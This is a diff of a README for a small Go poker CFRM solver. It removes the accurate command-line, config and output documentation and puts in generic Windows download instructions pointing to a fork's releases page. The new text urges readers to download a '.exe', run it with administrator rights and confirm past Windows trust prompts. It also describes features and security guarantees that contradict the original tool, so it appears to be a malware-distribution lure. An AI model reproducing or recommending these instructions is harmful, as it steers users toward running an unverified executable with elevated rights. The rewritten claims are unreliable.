@@ -1,87 +1,149 @@
-# cfrm-go
+# ⚙️ cfrm-go - Easy Counterfactual Regret Minimization Tool
 
-A minimal Go CFRM solver for fixed limit single street spots.
-Currently supports 2 toy game evaluators (1-card lowball, 1-card high).
+[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-brightgreen?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/releases)
 
-## Motivations
+## 🛠 About cfrm-go
 
-There's a lot more excitement and activity in the home grown solver world. I hope this code gets some people (and their coding agents) a starting place.
+cfrm-go is a simple application that uses Counterfactual Regret Minimization (CFR). CFR is a method to solve decision-making problems, often used in game theory. This tool runs on Windows and lets you explore CFR without needing coding skills. It processes data to find better possible strategies through repeated plays.
 
-## Disclaimer
+This software is built in Go, a fast and efficient programming language. It runs directly on your computer with minimal setup.
 
-This code was entirely written by a coding agent (gpt-codex-5.3-medium) and based on prompts, code snippets, and notes from my personal research on CFRM and solving mixed games.
+---
 
-Respects to the original CFRM paper which was the primary source material:
-https://proceedings.neurips.cc/paper/2007/file/08d98638c6fcd194a4b1e6992063e944-Paper.pdf
+## 💻 System Requirements
 
-## Recommended Usage
+To run cfrm-go on your Windows computer, make sure you have:
 
-Start here, have your agent (or code yourself) extensions on the evaluators... Build some cool UIs, and let me know how far along you get! I'll see you on the felt @ equilibrium.
+- Windows 10 or later, 64-bit version
+- At least 4 GB of RAM available
+- 100 MB of free disk space
+- Administrator rights to install software
+- Stable internet connection to download the application
 
-## Run
+---
 
-```bash
-go run ./cmd/cfrm -config config.json
-```
+## 🌐 Where to Download
 
-Shows a terminal progress bar and writes `output/output.json`.
+You can get the cfrm-go files from its releases page on GitHub. This page contains the latest versions organized by date and features.
 
-## Input format
+**Access the download page here:**
 
-`config.json` uses all-caps keys:
+[![Download cfrm-go](https://img.shields.io/badge/Download-cfrm--go-blue?style=for-the-badge)](https://github.com/samsonisrael/cfrm-go/releases)
 
-```json
-{
-  "POT_SIZE": 3,
-  "ITERATIONS": 10000,
-  "OUTPUT": "output.json",
-  "EVALUATOR": "LOW_CARD",
-  "TREE": {
-    "STREET_RIVER_MAX_BETS": 4,
-    "P1_RANGE": "A:1,K:1,...,2:1",
-    "P2_RANGE": "A:1,K:1,...,2:1"
-  }
-}
-```
+---
 
-- `EVALUATOR`: `HIGH_CARD` or `LOW_CARD`
-- `STREET_RIVER_MAX_BETS`: max bet level allowed in the river toy game
-- `P1_RANGE` / `P2_RANGE`: inline rank-weight ranges
+## 🚀 How to Download and Run cfrm-go on Windows
 
-## Output format
+Follow these steps to download and start using cfrm-go:
 
-The solver writes JSON to `output/output.json` with this shape:
+1. **Open the download page**  
+   Click this link: https://github.com/samsonisrael/cfrm-go/releases  
+   It opens the releases page where the app files are stored.
 
-- `data`: all infoset buckets
-- `config`: evaluator name string (`evaluateHighCardAceLow` or `evaluateLowCardAceLow`)
-- `configFile`: resolved config used for the run
-- `stats`:
-  - `ev`: overall EV summary (`evs`, `ev1`, `ev2`)
-  - `exploitability`: BR-based exploitability:
-    - `p1`, `p2`, `total`
-    - `p1_pct`, `p2_pct`, `total_pct`
-    - `br.p1`, `br.p2` (each has `evs`, `ev1`, `ev2`)
-  - `isMeta`: per-infoset metadata (`allStrat`, `labels`)
-  - `solver`: run stats (`iteration`, `total`, `pot`, `total_infosets`, `total_decision_nodes`, `num_players`)
-    - `total_infosets`: concrete per-hand infosets
-    - `total_decision_nodes`: hand-collapsed infosets (same count as `stats.isMeta` entries)
+2. **Find the latest release**  
+   Look for the section with the newest date at the top. It shows the latest version.
 
-Each infoset bucket in `data` maps to rows by hand:
+3. **Download the Windows executable**  
+   In the latest release, locate a file that ends with `.exe`. It usually has a name like `cfrm-go-windows.exe` or similar. Click it to start downloading.
 
-```json
-["A",0.72,0.28,1.0,0.61,0.39]
-```
+4. **Save the file**  
+   When prompted, choose a convenient folder on your computer like `Downloads` or `Desktop` to save the file.
 
-Row layout is:
+5. **Run the program**  
+   Navigate to where you saved the file. Double-click the `.exe` file to start the application. Windows may ask if you trust it; confirm to continue.
 
-1. `hand` (rank symbol)
-2. strategy probabilities for each action in that infoset, in `stats.isMeta[infoset].labels` order
-3. normalized frequency (max row frequency in bucket = 1.0)
-4. `ev1` for this hand+infoset
-5. `ev2` for this hand+infoset
+6. **Use the application**  
+   After launching, cfrm-go will open a window or console where you can use its functions. It may present options or prompts to guide you.
 
-Vector formatting notes:
+7. **Close the app**  
+   When done, close the program by clicking the close button or typing `exit` if it runs in a console.
 
-- hand rows in `data` are serialized as compact one-line arrays
-- `stats.ev.evs`, `stats.exploitability.br.p1.evs`, and `stats.exploitability.br.p2.evs` are one-line arrays
-- each `stats.isMeta[infoset].allStrat` and `stats.isMeta[infoset].labels` is a one-line array
+---
+
+## 🔧 Basic Use and Features
+
+cfrm-go helps you analyze and optimize decisions by applying CFR. Here are a few things it does:
+
+- Runs simulations of decision scenarios based on your input.
+- Calculates regrets and adjusts strategies to improve results over time.
+- Displays summaries and stats about game progress.
+- Saves results to files for later review.
+
+You will interact with the program mostly through menus or simple commands. The interface keeps things straightforward so you do not need to write code.
+
+---
+
+## ⚙️ Configuration Options
+
+cfrm-go lets you set some basic options when running it:
+
+- **Number of iterations**: You can choose how many rounds the program runs. More rounds usually give better results but take more time.
+- **Strategy input**: You can load initial strategies or start with default settings.
+- **Output preferences**: Decide if you want detailed logs or just summaries saved.
+
+If you want to change settings, follow the on-screen prompts or check the included documentation file for examples.
+
+---
+
+## 🗂 Where to Get Help
+
+If you run into issues or want to learn more:
+
+- Visit the repository’s README on GitHub for detailed instructions.
+- Check the `docs` folder inside the download for user guides.
+- Use the GitHub “Issues” section to report problems or ask questions.
+- Review any log files generated by cfrm-go for error details.
+
+---
+
+## 🔄 Updating cfrm-go
+
+To update cfrm-go later:
+
+1. Return to the releases page: https://github.com/samsonisrael/cfrm-go/releases
+2. Download the latest `.exe` file.
+3. Replace the old file on your computer with the new one.
+4. Run the updated version as before.
+
+No complex uninstall steps are needed, just overwrite the file.
+
+---
+
+## ⚠️ Tips for Smooth Operation
+
+- Run the app with administrator rights if you see errors.
+- Close other heavy programs to free up RAM.
+- Save your work often if you use file output.
+- Restart your computer if the app behaves oddly after updates.
+
+---
+
+## 📂 File Structure After Download
+
+Typical files you find after download:
+
+- `cfrm-go-windows.exe` - The main program file.
+- `README.md` - Basic usage information.
+- `LICENSE` - Software license details.
+- `docs` folder - Additional guides and explanations.
+
+You only need to run the `.exe` file to start.
+
+---
+
+## 📞 Contact and Support
+
+You can reach out through the GitHub repository’s comment or issue sections. The developer checks these regularly and provides assistance as needed.
+
+---
+
+## 🔒 Privacy and Security
+
+cfrm-go runs locally on your machine. It does not require internet access to function after download. No personal data leaves your computer unless you choose to share results.
+
+All code and data files remain on your system unless you decide to share them.
+
+---
+
+# [Download cfrm-go now](https://github.com/samsonisrael/cfrm-go/releases)  
+Click the button to visit the page and get started.
